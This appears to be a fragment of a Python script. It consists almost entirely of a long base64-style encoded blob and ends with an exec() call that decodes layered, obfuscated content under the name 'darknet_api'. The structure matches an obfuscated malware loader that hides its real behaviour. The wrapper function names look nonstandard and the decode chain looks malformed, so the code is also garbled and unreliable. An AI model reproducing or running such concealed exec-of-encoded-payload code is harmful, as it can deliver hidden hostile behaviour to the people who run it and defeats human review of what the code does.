FhbUpWV2pCVFZXUmhaRzFPY0ZGWWFFcFRSVFZ6VjFSSk5XUldjRWxVVlhSRVYwVTFlbGRzWkZka01IUkZWbGhDUkZvelFuSlhiR1JhV2pKS1NFOVhOV2hXZWxKMldrWm9UMkpIVG5OUFYzaHBWakJhZDFsclRqUk5WMDE1Vm01c1dVMHdTbTlaZWs1UFRUSkplbE50ZEV4V1J6bE1VVEZrYTJNeVNYbFRiV2hwVVRCS2QxbDZRbUZqUjA1MVZHcENSRm95ZUROWk1qRnpaRmRTUkZveWJGbFNlbEp3VXpGR2RsTnRUalZSVkd4S1UwVndjMWt4YUZkaVIwMTZWVzV3VFdKck5YTlplazVQWTBkSmVVNUhPVXhWTURWSlYyeG9VMDFIUmxoT1Z6VktVakJXYmxsdE1WZE5NR3hKVkcxNGFrMHdOWGRaYWtrd1V6Qk9XRlZ0YUd0U01GWnVWVVpPUTA0d2JIVldibkJoVjBWd01WZFdZM2hpUld4eFlqSmthMWRGTlhOWk1uYzFZa2RLV0ZKdVFtbFJNMlJ3V1RCa1IyVnRUWHBhU0ZwcVlsWkdjRlF5YkVOTlYwMTVWbTVzV1Uwd1NtOVplazVQVFRKSmVsTnRkRzFWTURWRVdrWmtjMk14Y0VoaVNGWmhaVlZKZDFsVlpGWmFNWEJJVW1wQ1dsVXdTblJaYWs1TFpFVk9ibUpIT1dGV01GcHlWMnhvUzJWcmJFVk5SMlJzWlZWd1JWbHFTVEZrVm5CWVZHcENhRlo2YkRGVFYzQjJZVlpyZVdWSVdtcE5iRlp3V214T1QxSlhSbGxVYldoYVlsaG9kMWx0TVdwYU1VMTVWbTE0YWxGNlJrTlphMlJ6VFd4d1ZGRnJVbWxOYWxZeFYyeGtUMDFIUmxoUFdGWkVXako0ZWxscVNtdGtiVkpaVlZka1VWVXdTalpVUnpGcllrZFNSRm95YkdoVFJrbDNXVEJvVGs1cmVEVlBXRUpwWWxaS2QxZHFTVFZoYlVsNVlraFdUV0pWTlhwWmFrNVhZVEIzZWxadWNHRlhSWEEyVkVSS05HUnNiM2xQVkVaclVUQnNlbGxWWkZkaFJuQklWbTVzYW1WcVJuWlhiR1JIWVRGd1dWTnVjRXhWTURWT1dXcEthMkp0UmxoT1Z6VktVbnByZUZwRlRrTk5SMFpJVmxka1dsWXdOWEZaYWs1WFpGZFNSRkZ0TVdwaVZHd3dVMVZvYTJKR2JHNWlNSEJxVTBWd2QxbHROVkppTUd4elpVUlNUbFl3Y0dsVVZWSjZaV3N4Y1dONlFrNVNla1pwVXpKM2Qxb3hWWHBWYldoclUwWmFObE5WVW5aYU1WSklUMWMxWVUxdGVERlhibXhEVlVkU1dWVlhhRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSMlZFVWs1V01IQnBWRlZqZDJGVmVFaFdibFpoVWtSQ2NGZEZhRXBoVlhSU1lqQndhazF1YUhOWGJHaENZakF4VkdFd2RFUldla1p2V1Zaak1Gb3hRbFJSYm5CTllsZFNjMXBGVG01aFYwWkpWV3BDYWxORk1ESlVTR3MxWTBkS2RGVnVRbUZOYW14eFdXcEtjMlJWZUhSVWJrNXBUVEZhY2xSSWJFcGpNa1pJVm0xb1lWSXhXalZaTTI5NFlqRndXRkp0ZEdGWFJYQTJVekZPVDFWSFRraFdibFpvVm5wV2RWTlZhRk5pTVhCVVVXNVNXbFl5ZURGVFZXaERZVVp2ZVZaVmRFUlhSVW8xV1Zaak1VMUZkRVJUYlU1c1VrVmFjRll6Y0VKT01ERTJVMVJrVDFKRlNqQldNMngzV2tWc1IxUnFRbHBYUmtsNFdUTnNRazVyYkVaUFdHUmhWbnBXZDFsdE1XcGFNVmw1Vm0xc1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4SFpVUlNUbFl3Y0dsVVZXTjNZVlY0U0ZadVZtRlNSRUp3VjBWb1NtRlZkRkppTUhCcVRXNW9jMWRzYUVKaU1ERlVZVEIwUkZZemFESlhha3B6WkZWc1JVMUhaR3BsVkZZeldXcE9UMDFGZEVSVGJUbHJVMFpLTTFremNIWmthM2Q1WWtoV1lWSXllSFZaYWtwUFpHMUdXRTVJVmxwTmJtZ3lXa1prVW1SdFVsbFViWGhxWW1zeE1sbHJZelZpYlVaWVRrZHNUVkV3U25aWGJHUkhZVEZ3V1ZOdWNGRldNbWh6VjFaa1UySkhUblZVV0U1S1VqRktiMXBGWkVaUFZuQklVbXBDV2xVeWRIRldWRXBYWkZad1NHSklWbUZsVlVwdlUxVmtOR1JzYjNsaVNGWktVakZLYjFwRlpFWlRNRTVaVVc1c2FGWjZWWGRUTUU1TFdUSldSVkp0YkZobGEwVXpWRmh3U2s0d05VVlJibEpZWlZoQ2ExTlZXazlOUm14WlZXcEdhbVZWUlRKVFZWWTBaR3h2ZVZwSVFtbGlWMDV1VlRGak1Gb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVYwVm9ibVZHYkhOak0yUnBWVEJzZWxkc1l6RmhNVUpVVTIxT2FtRlZiSGRSTW1SelpXMUtTRlp0ZUdwUk1tUTBVekZHZGxOc2EzbGxSMmhvVm5wQ2JsVkdUa05sYTNoMFdrZDRhMUV5WkhCWlZXaFRUVWRPU1ZSVVdrMWxWR3gzV1cweFUyTkdiM2xQVjNCcFRXMTRNVlJITVU5ak1rbDZWbTEwVFUxcmNESlpiVFZYWld0M2VWcEhlR3RTYW14d1dXcEpNVTFYVGpWVFdFSktUVVUxZWxkV1pITmtSMFpZVGxjMVNsTkdTblpYYkU1RFlWZEplVTVVUm1wa01qbExXWHBLTkdKR2NGbFJWemxPVlRKMFRGRXhaSE5pVld4SVpVaGFZVTF0ZURGVVJ6VlRZa2RXU1ZWWVZtRmlWM2d4VjJ0T2JtRldWWHBXYlhCYVRXeGFObGw2U21GTlYwcEVVVzFvYTFkR1NuWlphazVMWTBkV2RGSnFRbWhXZW13eFUxZHNjazVyYTNoVWJYaGFWMFZ3Y1ZsVlpITmtWbkExVVd4b2FVMHdjSEpaTTJ4RFlsZE9kRTlZVWtwVFJrcDJWMnhPUTJWV2NGbFVibVJwVFdwV05sZHNUa05rYlVwd1VXNU9hVTF0VW5kWmJXUjJVMnRPV1ZGdWJHaFdlbFYzVXpCT1Mxa3lTbk5sUkZKT1ZqQndhVlJWVW5wbGF6RnhZM3BDVGxKNlJtbFRNbmQzV2pGVmVsWnRjRnBOYkZvMldYcEtZVTFYU2tobFJGWktVbGhvTWxkcVNtdGlSbkJFVVc1Q2FXRlZSakZUVlUwd1dqQjRjRkZZVmtwUmVsSnVWRWRzUW1GR2FFbGFNMmhhWWtoT00xbHNUa3BqTVhCWVRsZDBVVlV3Y0dwWk1teEtZMFZPYm1KSGVHbFRSVFZ6VkRKa2RsTnJUbGxSYm14b1ZucFZkMU13VGt0VGJVcDBWRzVhYW1KcmNITlhWRTVTV2pGS1dFMVhhR2hXTTJSdVdXcE9TbG94VmtoU2JuQnFUVEpTTWxreU1WSmhWWFJTWWpCMFJGWXllSFJUVldSelpXeEtkR0pJYkdwTk1VVXlVVEprY2xOc2IzbFdha0paVFcxNE1WZHRNRFJpTWtwSVQxYzFhRlo2VWpGYVJXUlhUa2RTUkdFeWNGWlRSWEIzV1cwMVVsb3lVa2hoUjNoS1VqSjRNVmR0TURSYU1rbDVUa2RrYTFJeWFITlRWV1JoWTBkT2RWUnFRa3BUUlc5NFdXMWtkbE5yVGxoaVNIQlRZbGQ0TlZsNlRsSmFNVUpVVVd0a1dsWXphRFpYYkVaMlV6Qk9XRlJ1V210V2VsVjNWMFJLVTJSdFVYbE9SemxhVFc1b2IxbFdZM2RrVjFKSVZtcFNhMUV5ZEhGVmFrcFhUVWRTU0dKSVZtRmxWVWwzV1ZWa1Zsb3hSWGxQVkVacFlteEtSbGxxVG10a1ZVNXVZMGhhYW1WVVZqWmFWbWhQVFVad1dFMUhPVXBpVlRWNlYyeGtSMlZWYkhCaE1IUmFZbFZhTVZsdE1WZGxWWFJFWVRCMFJHRlZOWE5hVldSWFlXMVNXVlZ0ZUVwVFJrcDJWMnhPUTJNeVNYbGFTRUpwWVZWS2RGcEdZekZoYlZKSVlraGFhV0ZWVmt4YVJFcHZZMGRLU0ZaWFpGZFRSVzk0VjJ4U2RsTXdUbTVpU0U1cFRXMVNkMWx0Ykc5TlYwMTVWbTVzV1Uxc1dqQlhWbVJ6WXpCNFNWWnVjR0ZYUlhCdFdUQmtSMlZ0VFhwYVNGcHFZbFpHZDFOVVJrTmhSMDE2Vkc1Q2FXSlhUbTVaTUdSSFpWWnNXRTFYZUd0U01WbzFXVE5zUTAxSFNqVlJiazVwVFcxU2QxbHRiRU5pVjFKWVRsZHdhMUl5ZURKWmJXUjJVRkU5UFE9PQ==";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))